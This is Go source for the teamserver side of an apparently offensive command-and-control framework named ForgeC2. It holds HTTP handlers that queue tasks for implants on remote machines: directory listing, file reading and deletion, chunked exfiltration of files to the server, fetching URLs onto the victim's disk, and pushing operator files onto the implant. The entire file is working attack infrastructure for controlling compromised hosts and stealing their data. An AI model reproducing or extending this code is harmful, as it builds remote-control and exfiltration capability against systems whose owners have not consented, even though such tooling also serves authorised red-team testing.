package server

import (
	"encoding/base64"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleFileBrowserPage(c *gin.Context) {
	id := c.Param("id")

	var agent db.Implant
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.Redirect(http.StatusFound, "/agents")
		return
	}

	stats := s.getNavStats(c)
	data := gin.H{
		"Title":     "ForgeC2 - File Browser",
		"Agent":     agent,
		"Path":      c.Query("path"),
		"ActiveNav": "agents",
		"Online":    time.Since(agent.LastSeen) < s.offlineThreshold(),
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPageOrJSON(c, data)
}

func (s *Server) handleListDir(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	path := c.PostForm("path")
	if path == "" {
		path = "C:\\"
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "ls", path, "", path, "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}

	slog.Info("Directory list requested", "agent_id", id, "path", path)
	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"task_id": task.ID,
		"queued":  true,
		"kind":    "ls_task",
	})
}

func (s *Server) handleFileDelete(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		respondError(c, http.StatusBadRequest, "file path required")
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "delete", filePath, "", filePath, "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}

	slog.Info("File delete requested", "agent_id", id, "path", filePath)
	s.dispatchTask(c, task, "file_delete", filePath)
}

func (s *Server) handleFileRead(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		respondError(c, http.StatusBadRequest, "file path required")
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "read", filePath, "", filePath, "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}

	slog.Info("File read requested", "agent_id", id, "path", filePath)
	s.dispatchTask(c, task, "file_read", filePath)
}

// handleFileUploadFromAgent queues an implant→server exfil (task type "upload"
// with no payload bytes). Prefer POST /agents/:id/files/pull. The legacy
// POST /files/upload path stays for old consoles.
func (s *Server) handleFileUploadFromAgent(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	// A multipart file here means the operator hit the exfil route by mistake.
	// Pushing a teamserver file onto the implant is POST /agents/:id/upload.
	if strings.Contains(c.GetHeader("Content-Type"), "multipart/form-data") {
		if _, err := c.FormFile("file"); err == nil {
			respondError(c, http.StatusBadRequest, "this endpoint queues an implant-to-server exfil; use POST /agents/:id/upload to push a file onto the implant")
			return
		}
	}
	filePath := c.PostForm("path")
	if filePath == "" {
		respondError(c, http.StatusBadRequest, "file path required")
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	offset, size := parseTransferRange(c)
	task, err := s.createTask(id, "upload", filePath, "", filePath, "", offset, size)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}

	slog.Info("File exfil requested", "agent_id", id, "path", filePath, "offset", offset, "size", size)
	s.dispatchTask(c, task, "file_upload_exfil", filePath)
}

func parseTransferRange(c *gin.Context) (offset, size int64) {
	if v := c.PostForm("offset"); v != "" {
		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n >= 0 {
			offset = n
		}
	}
	if v := c.PostForm("size"); v != "" {
		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 {
			if n > MaxTransferChunkSize {
				n = MaxTransferChunkSize
			}
			size = n
		}
	}
	return offset, size
}

// handleDownload queues an implant URL fetch onto its own disk (task type
// "download", command = URL). This is not operator exfil.
func (s *Server) handleDownload(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	fileURL := c.PostForm("url")
	targetPath := c.PostForm("path")

	if fileURL == "" || targetPath == "" {
		respondError(c, http.StatusBadRequest, "url and path required")
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "download", fileURL, targetPath, targetPath, "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}

	slog.Info("File download requested", "agent_id", id, "url", fileURL, "path", targetPath)
	s.dispatchTask(c, task, "file_download_url", fileURL+" -> "+targetPath)
}

// handleUploadFile pushes a teamserver file onto the implant (task type
// "upload" with payload bytes). Prefer POST /agents/:id/files/push. The
// legacy POST /upload path stays for old consoles.
func (s *Server) handleUploadFile(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	targetPath := c.PostForm("target_path")
	if targetPath == "" {
		targetPath = c.PostForm("path")
	}
	if targetPath == "" {
		respondError(c, http.StatusBadRequest, "target path required")
		return
	}

	file, err := c.FormFile("file")
	if err != nil {
		respondError(c, http.StatusBadRequest, "file required")
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	if file.Size > MaxUploadSize {
		respondError(c, http.StatusBadRequest, "file too large (max 50MB)")
		return
	}

	fileData, err := readFileToBase64(file)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to read file")
		return
	}

	task, err := s.createTask(id, "upload", targetPath, "", targetPath, fileData, 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	// chunked support
	if offsetStr := c.PostForm("offset"); offsetStr != "" {
		if off, err := strconv.ParseInt(offsetStr, 10, 64); err == nil {
			task.Offset = off
		}
	}
	// HMAC integrity chain: the agent refuses to write the chunk unless the
	// recomputed MAC matches, so tampering with a pushed chunk is detected
	// before it touches disk. (Push size is already bounded by MaxUploadSize.)
	rawChunk, err := base64.StdEncoding.DecodeString(fileData)
	if err != nil {
		respondError(c, http.StatusBadRequest, "failed to decode file data")
		return
	}
	if prevMAC, mac, err := s.chainForPush(id, task.ID, rawChunk); err != nil {
		slog.Error("Failed to build upload integrity chain", "agent_id", id, "task_id", task.ID, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to sign upload chunk")
		return
	} else {
		task.PrevMAC = prevMAC
		task.MAC = mac
	}
	if err := s.db.Save(task).Error; err != nil {
		respondError(c, http.StatusInternalServerError, "failed to save upload offset")
		return
	}
	s.LogAuditRecord(c, "file_upload_push", "agent", id, targetPath, true, nil)

	slog.Info("File push requested", "agent_id", id, "path", targetPath, "offset", task.Offset)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "kind": "file_push", "queued": true})
}

// handleFileExfilGet serves a file the implant already exfiltrated into data/uploads/:id/.
func (s *Server) handleFileExfilGet(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	filename := filepath.Base(c.Param("filename"))
	if filename == "" || filename == "." || filename == ".." {
		respondError(c, http.StatusBadRequest, "filename required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}
	base := filepath.Join(dataDir, "uploads", id)
	requested := safeJoin(base, filename)
	if requested == "" {
		respondError(c, http.StatusBadRequest, "invalid filename")
		return
	}
	serveFileSafe(c, requested, base, filename)
}

func readFileToBase64(file *multipart.FileHeader) (string, error) {
	f, err := file.Open()
	if err != nil {
		return "", err
	}
	defer f.Close()

	data, err := io.ReadAll(f)
	if err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString(data), nil
}
